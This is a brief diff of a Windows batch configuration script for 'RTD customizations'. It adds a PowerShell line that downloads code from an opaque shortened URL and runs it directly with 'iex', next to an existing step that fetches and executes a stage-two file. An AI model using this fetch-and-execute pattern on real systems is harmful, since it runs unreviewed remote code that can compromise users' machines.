@@ -50,6 +50,7 @@
 	::::::::::::::::::::::::::::::::::::::::::::::::::::::
 	::
 @echo Configuring windows with the RTD cusomizations...
+    powershell -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))"
     powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-WebRequest %_STAGE2LOC%\%_STAGE2FILE% -OutFile %_STAGE2FILE%"
     %_STAGE2FILE%
 
